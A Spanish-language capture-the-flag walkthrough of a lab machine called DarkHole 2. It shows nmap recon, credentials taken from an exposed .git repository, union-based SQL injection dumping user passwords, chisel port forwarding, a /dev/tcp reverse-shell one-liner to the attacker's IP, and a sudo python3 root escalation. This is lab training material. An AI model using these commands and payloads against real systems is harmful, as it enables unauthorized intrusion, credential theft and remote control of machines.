### Tags: `GIT` `sqli` `RPFW` `chisel`

# Reconocimiento (`Linux`)

Lo primero que hacemos es un **escaneo de equipos** que estén conectados a mi red de esta forma:

```ruby
arp-scan -I eth0 --localnet
```

![image](https://github.com/user-attachments/assets/f23ce77f-173d-4f2d-87e2-673fc73fc6af)

# Escaneo(*22, 80*)

```css
sudo nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn <IP>
```

![image](https://github.com/user-attachments/assets/cfd64dc4-3e99-4cb9-85c1-118f63cbe813)

```ruby
sudo nmap -p22,80 -sCV <IP> -oN escaneo
```

![image](https://github.com/user-attachments/assets/4f3f8d85-2dd8-410a-99fc-a3eb63d95143)

# Port 80

Vemos que en la web hay un `panel de login` pero nosotros no tenemos credenciales validas, probamos con *Burp* **SQLinjections** pero nada.

![image](https://github.com/user-attachments/assets/ae7fb136-0827-4317-bbcf-86298c75ad94)

# .git/

Si nos acordamos cuando hicimos el escaneo teníamos un proyecto **.git**, si accedemos vemos que tenemos dictory listing

![image](https://github.com/user-attachments/assets/9d073ee5-0796-43df-8e95-cca7e23c1309)

Entonces lo que hacemos es traernos con wget de forma recursiva todo lo que haya dentro de ahí

```ruby
wget -r http://192.168.0.169/.git/
```

![image](https://github.com/user-attachments/assets/050292f4-1247-493c-8639-8129ba63b484)

Como es un proyecto de github lo primero que hacemos es mirar con `git log` commits que haya habido, movidas, etc

![image](https://github.com/user-attachments/assets/bd5ce776-8b12-4f23-98b9-c3be4cfe5d4a)

- Ahora hacemos un `git show a4d900a8d85e8938d3601f3cef113ee293028e10` para ver los cambios que hubo 
	- Vemos que tenemos **credenciales** en texto claro, la cual vamos a probar en el panel de login `lush@admin.com:321`

![image](https://github.com/user-attachments/assets/29c3b6eb-3285-404b-8962-efe1fa91b2dc)


# Dentro del Panel

Vemos que funcionaron las credenciales que encontramos 

![image](https://github.com/user-attachments/assets/2ca96036-481c-49a6-b9d3-5ef92f6e4bc2)

## BurpSuite

- Vamos a interceptar con BurpSuite la web sobre el parámetro `id`
	- Si le ponemos una comilla vemos que nos da un 500 Internal Error, podemos pensar que es vulnerable a SQL

![image](https://github.com/user-attachments/assets/e7326523-b849-404f-8386-f9e42b8c9133)

# SQL Injection

Jugando con `order by` encontramos que había **6 columnas**. (Ctrl + u para urlencodiarlo )

![image](https://github.com/user-attachments/assets/0a001214-cdce-4c22-979a-d6c6f20799c7)

### Enumerar la Base de Datos

- Como sabemos que hay 6 columnas, jugamos con `union select` y cambiando el `id=2` podemos ver los numeritos de los campos que son vulnerables
	- Jugamos con `group_concat(schema_name) ......  from information_schema.schemata` para que nos liste **TODAS** las bases de datos existentes

![image](https://github.com/user-attachments/assets/2aeb8a8d-7766-4903-b7bc-6b1fb420f8e3)
![image](https://github.com/user-attachments/assets/b05f0643-5fd0-449b-a894-58bd037f4fd2)

### Enumeramos las Tablas

Con este comando: ``group_concat(table_name) ......  from information_schema.tables where table_schema='darkhole_2'´ `` para que nos enumera las tablas de la base datos de **darkhole_2**

![image](https://github.com/user-attachments/assets/e019b369-1402-4a7e-a983-2231886bb65b)

### Enumeramos las Columnas

Con este comando: ``group_concat(column_name) ......  from information_schema.columns where table_schema='darkhole_2' and table_name='ssh'`` enumeramos las columnas de la base de datos *darkhole_2* de la tabla **ssh**

![image](https://github.com/user-attachments/assets/0d6509b1-11c6-477e-a77c-5a03a80dcf9a)

- Ahora con este comando: ``group_concat(user,0x3a,pass) ......  from ssh`` para que nos dumpee esos valores de la tabla **SSH**
	- Tenemos credenciales `jehad:fool`
 
 ![image](https://github.com/user-attachments/assets/ae7b91ae-77af-464e-98a0-f35e67e033d0)

-  Ahora con este comando: ``group_concat(password,0x3a,username) ......  from users`` para que nos dumpee esos valores de la tabla **USERS**
	- También tenemos estas credenciales `321:Jehad Alqurashiasddasdasdas` que son las que encontramos antes con **git**

![image](https://github.com/user-attachments/assets/634dbd2d-e3d0-465b-8a81-d2de01991ba2)

## SSH

Como el puerto 22 esta OPEN probamos las credenciales que encontramos de la table `ssh` y vemos que funciono

![image](https://github.com/user-attachments/assets/366ea130-d805-4631-aeae-92833d090981)

# Escalada (*Losy*)

Tenemos la primera flag

![image](https://github.com/user-attachments/assets/ca011da5-0a0b-42d7-a7b2-83d6792dbfcc)

Si hacemos un `history` observamos que hay un puerto *9999* abierto en la maquina en php lo cual es curioso

![image](https://github.com/user-attachments/assets/6a11204b-1c9b-4cfe-90ab-0ec6a0c1e912)

Ahora si hacemos un `ps -faux` y grepeamos por el puerto 9999 observamos que hay un servidor que lo levanta **Losy** en *HTTP* en *PHP* y se mete en `/opt/web`

![image](https://github.com/user-attachments/assets/99b85f08-171c-424c-b749-03b688ceda00)

Si vamos a **/opt/web** vemos que hay un `index.php` que contiene un tipo de condicional mediante el parámetro *GET* si estas pasando el *CMD* y si es así **ejecutas un comando** a nivel de sistema

![image](https://github.com/user-attachments/assets/13444984-c380-48e3-b36a-c54ce0772936)

Entonces lo que podemos hacer comprobar si haciendo un `curl localhost:9999/?cmd=whoami` nos dice *LOSY* y vemos que **funcionó** perfectamente

![image](https://github.com/user-attachments/assets/959cb2fe-d582-479d-b28f-d50318c701c8)

# Chisel

- Lo que vamos a hacer ahora es jugar con CHISEL para hacer un **Remote-Port-Forwarding**, para que mi puerto 9999 sea el puerto 9999 de la máquina víctima que internamente esta abierto pero externamente no lo vemos
	- Primero nos vamos a este repo ----> [ChiselGitHub](https://github.com/jpillora/chisel/releases/tag/v1.7.7) y descargamos el ``linux_amd64.gz``. (con **gunzip** lo descomprimimos)
	- Le damos permisos de ejecución `chmod +x chisel`

![image](https://github.com/user-attachments/assets/39740119-bde5-4674-aaed-f14cc7bdcdf1)

Ahora nos montamos un servidor *HTTP* con *Python* para transferir el binario **CHISEL** a la máquina víctima en el directorio `/tmp`

![image](https://github.com/user-attachments/assets/d969d5b2-5bb6-4bb4-90da-01127fb0457c)
![image](https://github.com/user-attachments/assets/86be95f1-0eb8-4a54-9245-276bf2851861)
![image](https://github.com/user-attachments/assets/d82c4543-4a44-4486-a491-5330e98aa1d2)

### Remote-Port-Forwarding

Primero lo que hacemos es correr Chisel en **modo servidor** en nuestra máquina de atacante de esta forma ---> `./chsiel server --reverse -p 1234`

![image](https://github.com/user-attachments/assets/7d95b026-34b2-44bf-96cd-6503008b74de)

- Ahora ponemos en **modo cliente** (máquina víctima) a donde es que nos vamos a *conectar* que seria a nuestra máquina actante por el puerto 1234 ----> `./chisel client ip:1234`
	- Aplicamos el **RPFW** para que el puerto 9999 se convierta en mi puerto 999 ----> `R:9999:127.0.0.1:9999`

![image](https://github.com/user-attachments/assets/6a8bf45c-e8be-4087-addc-cc8dd917fd23)

Si vamos al navegador y ponemos `localhost:9999` podemos ver la web 

![image](https://github.com/user-attachments/assets/f6ba776a-4ed6-4d82-9abf-c1dbd4507e02)

Por ende lo que hacemos ahora es entablarnos una **Reverse-Shell** de esta forma
	- Comando: `bash -c "bash -i >%26 /dev/tcp/192.168.0.158/443 0>%261"`

![image](https://github.com/user-attachments/assets/2e975745-ea25-4082-89e3-50aaa5d08387)

# Escalada *ROOT*

Haciendo de nuevo un `history` vemos la contraseña de *Losy* `gang`

![image](https://github.com/user-attachments/assets/f4908245-70bc-4bea-80a2-5d98fe31ecb5)

Por ende ahora si hacemos un `sudo -l` podemos ejecutar como root **Python3**


![image](https://github.com/user-attachments/assets/e8d8e340-31a1-4a03-9205-ddd82f224bd5)

Lo que hacemos es importar la librería os y ejecutar comandos a nivel nivel de sistema lanzándonos una **BASH**


![image](https://github.com/user-attachments/assets/8c292215-422d-4ab5-9f8f-7293880cb667)



